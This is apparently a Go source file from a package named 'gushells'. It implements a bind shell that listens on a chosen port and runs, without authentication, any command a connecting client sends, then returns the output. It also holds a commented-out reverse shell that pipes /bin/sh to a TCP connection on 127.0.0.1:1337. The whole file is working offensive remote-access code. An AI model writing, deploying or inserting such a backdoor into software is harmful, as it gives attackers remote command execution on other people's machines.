package gushells

import (
	//	"fmt"
	"gulogger"
	"net"
	"os"
	"os/exec"
	"strings"
)

func StartBindShell(tHost string, tPort string, tProto string) {

	gulogger.InitLogger()

	listen, err := net.Listen(tProto, tHost+":"+tPort)
	if err != nil {
		gulogger.Error.Println("Error : ", err.Error())
		os.Exit(1)
	}

	defer listen.Close()
	gulogger.Info.Println("Listening on : ", tHost, ":", tPort, " - ", tProto)

	for {
		conn, err := listen.Accept()
		if err != nil {
			gulogger.Error.Println("Error ", err.Error())
			os.Exit(1)
		}

		handleMultiRequest(conn)
	}
}

func handleMultiRequest(conn net.Conn) {

	for {
		buffer := make([]byte, 2048)

		length, err := conn.Read(buffer)
		if err != nil {
			conn.Write([]byte("Unable to understand"))
		}

		command := string(buffer[:length-1])
		c := strings.Fields(command)
		h := c[0]
		c = c[1:len(c)]

		out, err := exec.Command(h, c...).Output()
		if err != nil {
			conn.Write([]byte("Unable to exec"))
		}

		conn.Write(out)
	}

	conn.Close()
}

//func ReverseShell() {

//	c, _ := net.Dial("tcp", "127.0.0.1:1337")
//	cmd := exec.Command("/bin/sh")
//	cmd.Stdin = c
//	cmd.Stdout = c
//	cmd.Stderr = c
//	cmd.Run()
//}
